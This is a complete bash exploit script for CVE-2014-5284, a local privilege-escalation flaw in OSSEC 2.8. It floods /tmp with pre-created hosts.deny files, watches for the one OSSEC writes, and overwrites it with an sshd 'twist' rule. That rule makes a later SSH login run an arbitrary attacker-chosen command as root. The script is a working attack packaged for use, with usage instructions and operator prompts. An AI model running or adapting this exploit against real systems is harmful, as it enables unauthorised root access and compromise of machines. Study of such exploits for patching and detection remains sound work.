#!/bin/bash

### CVE-2014-5284
### Exploit Title: ossec 2.8 Insecure Temporary File Creation Vulnerability Privilege Escalation
### Python is nice but doesn't work all the time
### Exploit Author: mbadanoiu

# Python Exploit Author: skynet-13
# Vendor Homepage: www.ossec.net/
# Software Link: https://github.com/ossec/ossec-hids/archive/2.8.1.tar.gz
# Version: OSSEC  - 2.8

# Created from Research by
# Jeff Petersen
# Roka Security LLC
# jpetersen@rokasecurity.com
# Original info at https://github.com/ossec/ossec-hids/releases/tag/2.8.1

function create_files {
	echo "=============================================="
	echo "Creating /tmp/hosts.deny.300 through /tmp/hosts.deny.65536 ..."

	for i in $range; do
		echo -n > /tmp/hosts.deny.$i
	done
}

function watch_files {
	echo "=============================================="
        echo "Monitoring tmp for file change...."
        echo "ssh into the system a few times with an incorrect password"
        echo "Then wait for up to 10 mins"
        echo "=============================================="

	####insert non-empty logic here
	"$inotifywait" -e close_write /tmp/ --include "hosts.deny." |
	while read -r dir events file; do
		on_file_change "$dir$file"
		break
	done
}

function on_file_change {
	local file="$1"
	echo "File: $file has just been modified"
	write_exploit_to_file "$file"
}

function write_exploit_to_file {
	local file="$1"
	echo " sshd : ALL : twist $cmd " > "$file"	###Don't waste time with printing

	echo 'Writing exploit to this file'
	echo "=============================================="
        echo " ssh in again to execute the command"
        echo "=============================================="
        echo "               End Prog."
	exit
}

function verify_inotifywait {
	if [ ! -f "$inotifywait" ]; then
		inotifywait=$(which inotifywait)
		if [ ! "$inotifywait" ]; then
			echo -e "\nNo inotifywait found on the target!"
			echo "Configure and make inotify-tools then run this script again:"
			echo -e "\tcd inotify-tools && ./autogen.sh && ./configure && make\n"
			exit
		fi
	fi
}

#####MAIN######
cmd="$1"

if [ -z "$cmd" ]; then
	echo "Usage of program:"
	echo -e "\tbash $0 <Command_to_run_as_root_in_quotes>"
	exit
fi

range=$(seq 300 65535)

SCRIPT=$(realpath "$0")
SCRIPTPATH=$(dirname "$SCRIPT")
inotifywait="$SCRIPTPATH/inotify-tools/src/inotifywait"

verify_inotifywait

create_files
watch_files
